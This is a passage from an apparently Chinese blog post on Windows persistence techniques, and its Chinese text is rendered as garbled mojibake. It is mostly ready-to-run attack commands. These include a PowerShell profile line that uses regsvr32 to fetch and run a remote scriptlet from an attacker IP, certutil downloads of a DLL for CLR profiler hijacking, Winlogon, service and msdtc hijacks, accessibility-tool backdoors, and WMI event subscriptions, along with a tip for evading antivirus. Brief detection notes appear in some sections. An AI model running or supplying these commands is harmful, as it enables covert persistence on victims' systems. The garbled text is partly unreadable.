<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $profile</span><br><span class="line">Test-Path $profile</span><br><span class="line">New-Item -Path $profile -Type File â€“Force</span><br><span class="line">$string &#x3D; &#39;Invoke-Command -ScriptBlock &#123; regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;10.0.2.21:8080&#x2F;jWcEbr.sct s</span><br><span class="line">crobj.dll &#125;&#39; # Invoke-Commandå¯ä»¥ç”¨äºæ‰§è¡Œå‘½ä»¤</span><br><span class="line">$string | Out-File -FilePath &quot;C:\Users\pentestlab\Documents\WindowsPowerShell\Microsoft.PowerShe</span><br><span class="line">ll_profile.ps1&quot; -Append</span><br></pre></td></tr></table></figure>

<h3 id="åˆ©ç”¨clråŠ«æŒ-net"><a href="#åˆ©ç”¨clråŠ«æŒ-net" class="headerlink" title="åˆ©ç”¨clråŠ«æŒ.net"></a>åˆ©ç”¨clråŠ«æŒ.net</h3><p>CLR(Common Language Runtime)æ˜¯ä¸€ä¸ªå¯ç”±å¤šç§ç¼–ç¨‹è¯­è¨€ä½¿ç”¨çš„è¿è¡Œç¯å¢ƒ(ç±»ä¼¼JRE)ã€‚<br>CLRæ˜¯.NET Frameworkçš„ä¸»è¦æ‰§è¡Œå¼•æ“ï¼Œæ ¸å¿ƒåŠŸèƒ½åŒ…æ‹¬å†…å­˜ç®¡ç†ã€ç¨‹åºé›†åŠ è½½ã€å®‰å…¨æ€§ã€å¼‚å¸¸å¤„ç†å’Œçº¿ç¨‹åŒæ­¥ã€‚<br>åˆ©ç”¨ç›¸å…³å˜é‡ï¼šã€€</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COR_ENABLE_PROFILING: The CLR connects to a profiler only if this environment variable exists and is set to 1.</span><br><span class="line">COR_PROFILER: If the COR_ENABLE_PROFILING check passes, the CLR connects to the profiler that has this CLSID or ProgID, which must have been stored previously in the registry.</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨åŸç†å¯ä»¥é€šä¿—è§£é‡Šä¸ºï¼šæ‰€æœ‰.NETç¨‹åºéƒ½ä¼šåœ¨CLRè¿è¡Œï¼Œå¦‚æœè®¾ç½®äº†COR_ENABLE_PROFILINGï¼Œé‚£ä¹ˆCOR_PROFILERæŒ‡å®šçš„DLLä¼šè¢«åŠ è½½åˆ°CLRä¸­è¿è¡Œã€‚å³ä¸€æ—¦.NETç¨‹åºè¿è¡Œï¼ŒCOR_PROFILERæŒ‡å®šçš„DLLå°±ä¼šè¢«è§¦å‘è¿è¡Œã€‚</p>
<p>32ä½POCï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic ENVIRONMENT create name&#x3D;&quot;COR_ENABLE_PROFILING&quot;,username&#x3D;&quot;%username%&quot;,VariableValue&#x3D;&quot;1&quot;</span><br><span class="line">wmic ENVIRONMENT create name&#x3D;&quot;COR_PROFILER&quot;,username&#x3D;&quot;%username%&quot;,VariableValue&#x3D;&quot;&#123;11111111-1111-1111-1111-111111111111&#125;&quot;</span><br><span class="line">certutil.exe -urlcache -split -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;3gstudent&#x2F;test&#x2F;master&#x2F;msg.dll</span><br><span class="line">certutil.exe -urlcache -split -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;3gstudent&#x2F;test&#x2F;master&#x2F;msg.dll delete</span><br><span class="line">SET KEY&#x3D;HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32</span><br><span class="line">REG.EXE ADD %KEY% &#x2F;VE &#x2F;T REG_SZ &#x2F;D &quot;%CD%\msg.dll&quot; &#x2F;F</span><br><span class="line">REG.EXE ADD %KEY% &#x2F;V ThreadingModel &#x2F;T REG_SZ &#x2F;D Apartment &#x2F;F</span><br></pre></td></tr></table></figure>
<p>64ä½POCï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic ENVIRONMENT create name&#x3D;&quot;COR_ENABLE_PROFILING&quot;,username&#x3D;&quot;%username%&quot;,VariableValue&#x3D;&quot;1&quot;</span><br><span class="line">wmic ENVIRONMENT create name&#x3D;&quot;COR_PROFILER&quot;,username&#x3D;&quot;%username%&quot;,VariableValue&#x3D;&quot;&#123;11111111-1111-1111-1111-111111111111&#125;&quot;</span><br><span class="line">certutil.exe -urlcache -split -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;3gstudent&#x2F;test&#x2F;master&#x2F;msg.dll</span><br><span class="line">certutil.exe -urlcache -split -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;3gstudent&#x2F;test&#x2F;master&#x2F;msg.dll delete</span><br><span class="line">certutil.exe -urlcache -split -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;3gstudent&#x2F;test&#x2F;master&#x2F;msg_x64.dll</span><br><span class="line">certutil.exe -urlcache -split -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;3gstudent&#x2F;test&#x2F;master&#x2F;msg_x64.dll delete</span><br><span class="line">SET KEY&#x3D;HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32</span><br><span class="line">REG.EXE ADD %KEY% &#x2F;VE &#x2F;T REG_SZ &#x2F;D &quot;%CD%\msg_x64.dll&quot; &#x2F;F</span><br><span class="line">REG.EXE ADD %KEY% &#x2F;V ThreadingModel &#x2F;T REG_SZ &#x2F;D Apartment &#x2F;F </span><br><span class="line">SET KEY&#x3D;HKEY_CURRENT_USER\Software\Classes\WoW6432Node\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32</span><br><span class="line">REG.EXE ADD %KEY% &#x2F;VE &#x2F;T REG_SZ &#x2F;D &quot;%CD%\msg.dll&quot; &#x2F;F</span><br><span class="line">REG.EXE ADD %KEY% &#x2F;V ThreadingModel &#x2F;T REG_SZ &#x2F;D Apartment &#x2F;F</span><br></pre></td></tr></table></figure>

<p>POC ref:<a href="https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-maintain-persistence/">Use CLR to maintain persistence</a></p>
<p>æ³¨æ„é€šè¿‡wmicå‘½ä»¤ä¿®æ”¹ç¯å¢ƒå˜é‡å¯èƒ½ä¼šè¢«æ€è½¯(360..)æ‹¦æˆªï¼Œå¯ä»¥æ›¿æ¢ä¸ºé€šè¿‡powershellå†™æ³¨å†Œè¡¨ï¼Œæ•ˆæœæ˜¯ç›¸åŒçš„ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">New-ItemProperty &quot;HKCU:\Environment\&quot; COR_ENABLE_PROFILING -value &quot;1&quot; -propertyType string | Out-Null</span><br><span class="line">New-ItemProperty &quot;HKCU:\Environment\&quot; COR_PROFILER -value &quot;&#123;11111111-1111-1111-1111-111111111111&#125;&quot; -propertyType string | Out-Null</span><br></pre></td></tr></table></figure>

<h4 id="æ’æŸ¥-1"><a href="#æ’æŸ¥-1" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h4><p>æ£€æŸ¥ç¯å¢ƒå˜é‡<code>COR_ENABLE_PROFILING</code>å’Œ<code>COR_PROFILER</code><br>æ£€æŸ¥æ³¨å†Œè¡¨é”®å€¼<code>HKEY_CURRENT_USER\Software\Classes\CLSID\</code></p>
<h3 id="LogonScript"><a href="#LogonScript" class="headerlink" title="LogonScript"></a>LogonScript</h3><p>æ³¨å†Œè¡¨è·¯å¾„ï¼š<code>HKCU\Environment\</code><br>åˆ›å»ºå­—ç¬¦ä¸²é”®ï¼š<code>UserInitMprLogonScript</code>ï¼Œé”®å€¼è®¾ç½®ä¸ºæ¶æ„ç¨‹åºç»å¯¹è·¯å¾„ã€‚<br>åˆ©ç”¨è¯¥æ–¹æ³•å¯ä»¥ä¸€å®šç¨‹åº¦ä¸Šç»•è¿‡æ€è½¯ï¼Œä½†æœ‰äº›æ€è½¯ä¼˜æ˜¯å…ˆäºLogon Scriptså¯åŠ¨çš„ã€‚</p>
<h4 id="æ’æŸ¥-2"><a href="#æ’æŸ¥-2" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h4><p>æ’æŸ¥æ³¨å†Œè¡¨é”®å€¼<code>HKCR\Environment\UserInitMprLogonScript</code></p>
<h2 id="ç®¡ç†å‘˜æƒé™"><a href="#ç®¡ç†å‘˜æƒé™" class="headerlink" title="ç®¡ç†å‘˜æƒé™"></a>ç®¡ç†å‘˜æƒé™</h2><h3 id="Winlogon-Helper-DLL"><a href="#Winlogon-Helper-DLL" class="headerlink" title="Winlogon Helper DLL"></a>Winlogon Helper DLL</h3><p>Winlogonæ˜¯è´Ÿè´£å¤„ç†å®‰å…¨ç›¸å…³çš„ç”¨æˆ·äº¤äº’ç•Œé¢çš„ç»„ä»¶ï¼Œä¾‹å¦‚ç™»å…¥ã€ç™»å‡ºã€åœ¨è®¤è¯æ—¶åŠ è½½ç”¨æˆ·ä¿¡æ¯ã€å…³æœºã€é”å±ç­‰ã€‚<br>å¯ä»¥å¯¹ä»¥ä¸‹æ³¨å†Œè¡¨é¡¹è¿›è¡Œç¯¡æ”¹ï¼Œæ³¨æ„ç¨‹åºéœ€è¦æ”¾åœ¨system32ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</span><br><span class="line"># Shell - explorer.exe,door.exe</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</span><br><span class="line"># Userinit - C:\Windows\system32\userinit.exe,door.exe</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify</span><br><span class="line"># Notifyä¸€èˆ¬åœ¨win7ä¹‹å‰çš„ç³»ç»Ÿæ‰æœ‰ï¼Œæ›¿æ¢å…¶DLLNameé¡¹ä¸ºdoor.exeå³å¯</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨å‘½ä»¤ä¿®æ”¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; &#x2F;v Userinit &#x2F;d &quot;Userinit.exe, pentestlab.exe&quot; &#x2F;f</span><br><span class="line">reg add &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; &#x2F;v Shell &#x2F;d &quot;explorer.exe, pentestlab.exe&quot; &#x2F;f</span><br><span class="line"># cmd</span><br><span class="line"></span><br><span class="line">Set-ItemProperty &quot;HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\&quot; &quot;Userinit&quot; &quot;Userinit.exe, pentestlab.exe&quot; -Force</span><br><span class="line">Set-ItemProperty &quot;HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\&quot; &quot;Shell&quot; &quot;explorer.exe, pentestlab.exe&quot; -Force</span><br><span class="line"># powershell</span><br></pre></td></tr></table></figure>

<h3 id="AddMonitor"><a href="#AddMonitor" class="headerlink" title="AddMonitor()"></a>AddMonitor()</h3><p>è¯¥æƒé™ç»´æŒæ–¹å¼æºäº14å¹´Defcon22ã€‚<br>åŸç†ï¼šprint spooler serviceè´Ÿè´£ç®¡ç†Windowsç³»ç»Ÿä¸­çš„æ‰“å°ä½œä¸šï¼Œprint spoolerçš„APIåŒ…å«äº†ä¸€ä¸ªå‡½æ•°AddMonitor()ç”¨äºæŒ‰ç…§æœ¬åœ°ç«¯å£ç®¡ç†å™¨å¹¶å…³è”é…ç½®æ–‡ä»¶ã€æ•°æ®ã€ç®¡ç†å™¨æ–‡ä»¶ã€‚è¯¥å‡½æ•°é€šè¿‡åˆ›å»ºæ³¨å†Œè¡¨é”®æ¥å‘<code>spoolsv.exe</code>è¿›ç¨‹æ³¨å…¥dllæ–‡ä»¶ã€‚</p>
<p>å…·ä½“æ“ä½œï¼š<a href="https://www.ired.team/offensive-security/persistence/t1013-addmonitor">t1013-addmonitor</a></p>
<h4 id="æ’æŸ¥-3"><a href="#æ’æŸ¥-3" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h4><p>å¯¹åº”æ³¨å†Œè¡¨é¡¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors</span><br></pre></td></tr></table></figure>

<h3 id="çƒ­é”®åˆ©ç”¨"><a href="#çƒ­é”®åˆ©ç”¨" class="headerlink" title="çƒ­é”®åˆ©ç”¨"></a>çƒ­é”®åˆ©ç”¨</h3><p>sethc.exe           ç²˜æ»é”®<br>magnify.exe         æ”¾å¤§é•œåé—¨<br>utilman.exe         å®ç”¨ç¨‹åº<br>osk.exe             å±å¹•é”®ç›˜<br>displayswitch.exe   æ‰©å±•å±å¹•<br>atbroker.exe        è¾…åŠ©ç®¡ç†å·¥å…·<br>narrator.exe        è®²è¿°äºº</p>
<h4 id="Narrator"><a href="#Narrator" class="headerlink" title="Narrator"></a>Narrator</h4><p>Win10ä¸­Narratoræ˜¯ä¸€ä¸ªå±å¹•é˜…è¯»åº”ç”¨ç¨‹åºï¼Œå¯ä»¥è¢«åˆ©ç”¨äºæ— æ–‡ä»¶æƒé™ç»´æŒã€‚</p>
<h5 id="åˆ©ç”¨1"><a href="#åˆ©ç”¨1" class="headerlink" title="åˆ©ç”¨1"></a>åˆ©ç”¨1</h5><p>1.å‰å¾€æ³¨å†Œè¡¨ä½ç½®ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Computer\HKEY_CURRENT_USER\Software\Classes\AppXypsaf9f1qserqevf0sws76dx4k9a5206\Shell\open\command</span><br></pre></td></tr></table></figure>
<p>2.åˆ é™¤<code>DelegateExecute</code>é¡¹<br>3.å°†é»˜è®¤é¡¹çš„å€¼ä¿®æ”¹ä¸ºè¦æ‰§è¡Œçš„å‘½ä»¤<br><img src="/images/narrator%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9%E4%BF%AE%E6%94%B9.png" alt="narratoræ³¨å†Œè¡¨é¡¹"></p>
<h5 id="åˆ©ç”¨2"><a href="#åˆ©ç”¨2" class="headerlink" title="åˆ©ç”¨2"></a>åˆ©ç”¨2</h5><p>Narratorçš„ä¸€ä¸ªä¸æœ¬åœ°åŒ–è®¾ç½®æ— å…³çš„DLLï¼Œå¯ä»¥è¢«æ›¿æ¢ä¸ºæ¶æ„DLL(ä¸ä¿®æ”¹æ–‡ä»¶å)ã€‚<br>æ–‡ä»¶ä½ç½®ï¼š<code>C:\Windows\System32\Speech\Engines\TTS\MSTTSLocEnUS.DLL</code></p>
<h3 id="ä¿®æ”¹æœåŠ¡"><a href="#ä¿®æ”¹æœåŠ¡" class="headerlink" title="ä¿®æ”¹æœåŠ¡"></a>ä¿®æ”¹æœåŠ¡</h3><p>è¿™ç§æƒé™ç»´æŒæ–¹å¼éå¸¸å®¹æ˜“è¢«å‘ç°ï¼Œä¸æ¨èï¼Œä½†åœ¨é˜²æŠ¤å¾ˆå¼±çš„ç¯å¢ƒä¸‹å¯ä»¥å°è¯•ä½¿ç”¨ã€‚<br>ä¿®æ”¹æœåŠ¡ä¸€èˆ¬é€šè¿‡è¿™ä¸‰ç§ä½ç½®æ¥å®Œæˆï¼šbinPathã€ImagePathã€FailureCommand</p>
<h4 id="binPath"><a href="#binPath" class="headerlink" title="binPath"></a>binPath</h4><p><code>sc</code>å‘½ä»¤å¯ä»¥å¯¹æœåŠ¡è¿›è¡Œæ“ä½œï¼ŒåŒ…æ‹¬å¯åŠ¨ã€æš‚åœã€åœæ­¢ã€ä¿®æ”¹æ–‡ä»¶è·¯å¾„ç­‰ã€‚<br>ç¤ºä¾‹ï¼š<br>Faxæ˜¯win10ä¸­è‡ªå¸¦ä½†ä¸€èˆ¬ä¸ä½¿ç”¨çš„æœåŠ¡ï¼Œå› æ­¤æ˜¯ä¸ªä¸é”™çš„ä¿®æ”¹é€‰æ‹©ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc config Fax binPath&#x3D; &quot;C:\windows\system32\pentestlab.exe&quot;</span><br><span class="line">sc start Fax</span><br></pre></td></tr></table></figure>
<p>è¿˜å¯ä»¥å°†è¯¥æœåŠ¡ç›´æ¥è®¾ç½®ä¸ºè‡ªå¯åŠ¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc config Fax binPath&#x3D; &quot;C:\Windows\System32\pentestlab.exe&quot; start&#x3D;&quot;auto&quot; obj&#x3D;&quot;LocalSystem&quot;</span><br></pre></td></tr></table></figure>

<h4 id="ImagePath"><a href="#ImagePath" class="headerlink" title="ImagePath"></a>ImagePath</h4><p>å³å¸¸ç”¨çš„ä¿®æ”¹æ³¨å†Œè¡¨é”®å€¼çš„æ‰‹æ®µï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time&quot; &#x2F;v ImagePath &#x2F;t REG_SZ &#x2F;d &quot;C:\tmp\pentestlab.exe&quot;</span><br></pre></td></tr></table></figure>

<h4 id="FailureCommand"><a href="#FailureCommand" class="headerlink" title="FailureCommand"></a>FailureCommand</h4><p>å½“æŸä¸ªæœåŠ¡å¯åŠ¨å¤±è´¥æˆ–è¢«ä¸­æ­¢æ—¶ï¼Œå¯ä»¥æ‰§è¡ŒæŸäº›æ“ä½œã€‚è¿™ä¸ªæ“ä½œå¯¹äºæ³¨å†Œè¡¨é¡¹çš„é”®åä¸º<code>FailureCommand</code>ï¼Œå€¼ä¸ºè¦æ‰§è¡Œçš„æ“ä½œã€‚<br>ä¾‹å¦‚è¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time&quot; &#x2F;v FailureCommand &#x2F;t REG_SZ &#x2F;d &quot;C:\tmp\pentestlab.exe&quot;</span><br><span class="line"># æˆ–å¯ä»¥ç”¨scå‘½ä»¤æ¥æŒ‡å®šFailureCommand</span><br><span class="line">sc failure Fax command&#x3D; &quot;\&quot;c:\Windows\system32\pentestlab.exe\&quot;&quot;</span><br></pre></td></tr></table></figure>
<p>ä¹‹åå†killå¯¹åº”æœåŠ¡æ—¶ï¼Œpentestlab.exeå°±ä¼šæ‰§è¡Œã€‚</p>
<p>æ³¨æ„åœ¨å…·ä½“æœåŠ¡å±æ€§ä¸­çš„Recoveryï¼Œå¯ä»¥è®¾ç½®ç¬¬1-3æ¬¡å¤±è´¥æ—¶æ‰§è¡Œçš„æ“ä½œï¼Œåªå°†ç¬¬ä¸€æ¬¡è®¾ç½®ä¸ºè¿è¡Œç¨‹åºã€‚<br>ä»¥åŠè¯¥æ–¹å¼åº”è¯¥éå¸¸å®¹æ˜“è¢«æ€ã€‚</p>
<h3 id="msdtcæœåŠ¡dllåŠ«æŒ"><a href="#msdtcæœåŠ¡dllåŠ«æŒ" class="headerlink" title="msdtcæœåŠ¡dllåŠ«æŒ"></a>msdtcæœåŠ¡dllåŠ«æŒ</h3><p>msdtc(Microsoft Distributed Transaction Coordinator)æ˜¯WindowsæœåŠ¡ï¼Œè´Ÿè´£åè°ƒæ•°æ®åº“ä¸webæœåŠ¡å™¨ã€‚<br>æœåŠ¡å¯åŠ¨æ—¶ä¼šä»System32æ–‡ä»¶ä¸‹åŠ è½½3ä¸ªdllæ–‡ä»¶ï¼š<br>1.oci.dll<br>2.SQLLib80.dll<br>3.xa80.dll<br>å®ƒä»¬åœ¨æ³¨å†Œè¡¨é¡¹<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI</code>ä¸‹ã€‚<br>ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSystem32æ–‡ä»¶å¤¹ä¸‹æ²¡æœ‰<code>oci.dll</code>ï¼Œå› æ­¤å¯ä»¥æŠŠå®ƒåŠ«æŒä¸ºæ¶æ„dllï¼Œå¦‚æœåŒåéœ€è¦ç®¡ç†å‘˜æƒé™ã€‚<br>å¯åŠ¨msdtcå‘½ä»¤ï¼š<code>net start msdtc</code><br>åŠ«æŒåï¼Œdllè¿è¡Œæƒé™ä¸º<code>NT AUTHORITY\NETWORK SERVICE</code>ã€‚å¦‚æœç»ˆç«¯å¯æ‰§è¡Œ<code>msdtc -install</code>ï¼Œæƒé™èƒ½æå‡ä¸ºå¯¹åº”ç”¨æˆ·æƒé™ã€‚<br>é»˜è®¤æƒ…å†µä¸‹msdtcåœ¨ä¸»æœºé‡å¯åä¸ä¼šè‡ªå¯åŠ¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc qc msdtc # æŸ¥çœ‹æœåŠ¡è¯¦æƒ…</span><br><span class="line">sc config msdtc start&#x3D; auto # è®¾ç½®è‡ªå¯åŠ¨</span><br></pre></td></tr></table></figure>

<h3 id="åˆ›å»ºæœåŠ¡"><a href="#åˆ›å»ºæœåŠ¡" class="headerlink" title="åˆ›å»ºæœåŠ¡"></a>åˆ›å»ºæœåŠ¡</h3><p>åˆ›å»ºæœåŠ¡éœ€è¦æœ¬åœ°ç®¡ç†å‘˜æƒé™ã€‚<br>cmdå‘½ä»¤è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc create pentestlab binpath&#x3D; &quot;cmd.exe &#x2F;k C:\temp\pentestlab.exe&quot; start&#x3D;&quot;auto&quot; obj&#x3D;&quot;LocalSystem&quot;</span><br><span class="line">sc start pentestlab</span><br></pre></td></tr></table></figure>
<p>powershellå‘½ä»¤è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">New-Service -Name &quot;pentestlab&quot; -BinaryPathName &quot;C:\temp\pentestlab.exe&quot; -Description &quot;PentestLaboratories&quot; -StartupType Automatic</span><br><span class="line">sc start pentestlab</span><br></pre></td></tr></table></figure>

<h4 id="æ’æŸ¥-4"><a href="#æ’æŸ¥-4" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h4><p>autorunså·¥å…·æ£€æŸ¥å·²æœ‰çš„æœåŠ¡ï¼Œå¹¶éªŒè¯æœåŠ¡æ¨¡å—çš„åˆæ³•æ€§ã€‚å¦‚éªŒè¯æ˜¯å¦æœ‰æ–‡ä»¶ç­¾åã€ç­¾åæ˜¯å¦æ­£å¸¸ã€‚</p>
<h3 id="wmiäº‹ä»¶"><a href="#wmiäº‹ä»¶" class="headerlink" title="wmiäº‹ä»¶"></a>wmiäº‹ä»¶</h3><p>ä»æ”»é˜²è§’åº¦æ¥çœ‹ï¼ŒWMIæœ€å¼ºå¤§çš„åŠŸèƒ½ä¹‹ä¸€æ˜¯WMIèƒ½å¤Ÿå“åº”WMIäº‹ä»¶ï¼Œè€ŒWMIäº‹ä»¶å¯ç”¨äºå“åº”å‡ ä¹ä»»ä½•æ“ä½œç³»ç»Ÿäº‹ä»¶ã€‚æœ‰ä¸¤ç±»WMIäº‹ä»¶ï¼Œæœ¬åœ°äº‹ä»¶æŒç»­ä¸»æœºè¿›ç¨‹çš„ç”Ÿå‘½å‘¨æœŸï¼Œè€Œæ°¸ä¹…WMIäº‹ä»¶å­˜å‚¨åœ¨WMIå­˜å‚¨åº“ä¸­ï¼Œä»¥SYSTEMèº«ä»½è¿è¡Œï¼Œå¹¶åœ¨é‡æ–°å¼•å¯¼åä¿æŒä¸å˜ã€‚<br>wmiäº‹ä»¶è®¢é˜…éœ€è¦3æ­¥ï¼š<br>step1ï¼šæ³¨å†Œäº‹ä»¶è¿‡æ»¤å™¨ï¼Œå³äº‹ä»¶çš„è§¦å‘æ¡ä»¶(__EventFilter)<br>step2ï¼šæ³¨å†Œäº‹ä»¶æ¶ˆè´¹è€…ï¼Œå³è§¦å‘äº‹ä»¶æ—¶è¦æ‰§è¡Œçš„æ“ä½œ(EventConsumer)<br>step3ï¼šç»‘å®šäº‹ä»¶æ¶ˆè´¹è€…å’Œè¿‡æ»¤å™¨ï¼Œç»‘å®šä»¥åœ¨äº‹ä»¶è§¦å‘æ—¶æ‰§è¡ŒæŒ‡å®šæ“ä½œ(__FilterToConsumerBinding)</p>
<h4 id="ä¼ ç»Ÿmof"><a href="#ä¼ ç»Ÿmof" class="headerlink" title="ä¼ ç»Ÿmof"></a>ä¼ ç»Ÿmof</h4><p>mof(Managed object format)æ˜¯ç”¨äºæè¿°CIM(Common Information Model)ç±»çš„è¯­è¨€ã€‚mofæ–‡ä»¶å†…å®¹ç¼–è¯‘æ—¶ä¼šæ·»åŠ åˆ°wmiå­˜å‚¨åº“ã€‚<br>æ–‡ä»¶å†…å®¹ç¤ºä¾‹ï¼Œcmd.exeä¼šåœ¨notepad.exeè¿›ç¨‹åˆ›å»ºæ—¶æ‰§è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#PRAGMA NAMESPACE (&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line">instance of CommandLineEventConsumer as $Cons</span><br><span class="line">&#123;</span><br><span class="line">    Name &#x3D; &quot;Pentestlab&quot;;</span><br><span class="line">    RunInteractively&#x3D;false;</span><br><span class="line">    CommandLineTemplate&#x3D;&quot;cmd.exe&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __EventFilter as $Filt</span><br><span class="line">&#123;</span><br><span class="line">    Name &#x3D; &quot;Pentestlab&quot;;</span><br><span class="line">    EventNamespace &#x3D; &quot;root\\subscription&quot;;</span><br><span class="line">    Query &#x3D;&quot;SELECT * FROM __InstanceCreationEvent Within 3&quot;</span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_Process\&quot; &quot;</span><br><span class="line">            &quot;And Targetinstance.Name &#x3D; \&quot;notepad.exe\&quot; &quot;;</span><br><span class="line">    QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123; </span><br><span class="line">     Filter &#x3D; $Filt;</span><br><span class="line">     Consumer &#x3D; $Cons;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>ç¼–è¯‘å‘½ä»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mofcomp.exe .\wmi.mof</span><br></pre></td></tr></table></figure>
<p>è¯¥æŠ€æœ¯å› ä¼šç”¨åˆ°mofæ–‡ä»¶ï¼Œå› æ­¤ä¸æ¨èã€‚(æœ‰å¦ä¸€ç§wmiæ— mofæ–‡ä»¶æƒé™ç»´æŒçš„æ–¹å¼)</p>
<h4 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h4><p>ç¤ºä¾‹ï¼Œpentestlab.exeä¼šåœ¨æ¯æ¬¡ä¸»æœºå¼€æœº60ç§’å†…æ‰§è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name&#x3D;&quot;PentestLab&quot;, EventNameSpace&#x3D;&quot;root\cimv2&quot;,QueryLanguage&#x3D;&quot;WQL&quot;, Query&#x3D;&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot;</span><br><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name&#x3D;&quot;PentestLab&quot;, ExecutablePath&#x3D;&quot;C:\Windows\System32\pentestlab.exe&quot;,CommandLineTemplate&#x3D;&quot;C:\Windows\System32\pentestlab.exe&quot;</span><br><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter&#x3D;&quot;__EventFilter.Name&#x3D;\&quot;PentestLab\&quot;&quot;, Consumer&#x3D;&quot;CommandLineEventConsumer.Name&#x3D;\&quot;PentestLab\&quot;&quot;</span><br></pre></td></tr></table></figure>

<h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><p>ç¤ºä¾‹ï¼Œpentestlab.exeä¼šåœ¨æ¯æ¬¡ä¸»æœºå¼€æœº5åˆ†é’Ÿå†…æ‰§è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$FilterArgs &#x3D; @&#123;name&#x3D;&#39;Pentestlab-WMI&#39;;</span><br><span class="line">                EventNameSpace&#x3D;&#39;root\CimV2&#39;;</span><br><span class="line">                QueryLanguage&#x3D;&quot;WQL&quot;;</span><br><span class="line">                Query&#x3D;&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39; AND TargetInstance.SystemUpTime &gt;&#x3D; 240 AND TargetInstance.SystemUpTime &lt; 325&quot;&#125;;</span><br><span class="line">$Filter&#x3D;New-CimInstance -Namespace root&#x2F;subscription -ClassName __EventFilter -Property $FilterArgs</span><br><span class="line"> </span><br><span class="line">$ConsumerArgs &#x3D; @&#123;name&#x3D;&#39;Pentestlab-WMI&#39;;</span><br><span class="line">                CommandLineTemplate&#x3D;&quot;$($Env:SystemRoot)\System32\pentestlab.exe&quot;;&#125;</span><br><span class="line">$Consumer&#x3D;New-CimInstance -Namespace root&#x2F;subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs</span><br><span class="line"> </span><br><span class="line">$FilterToConsumerArgs 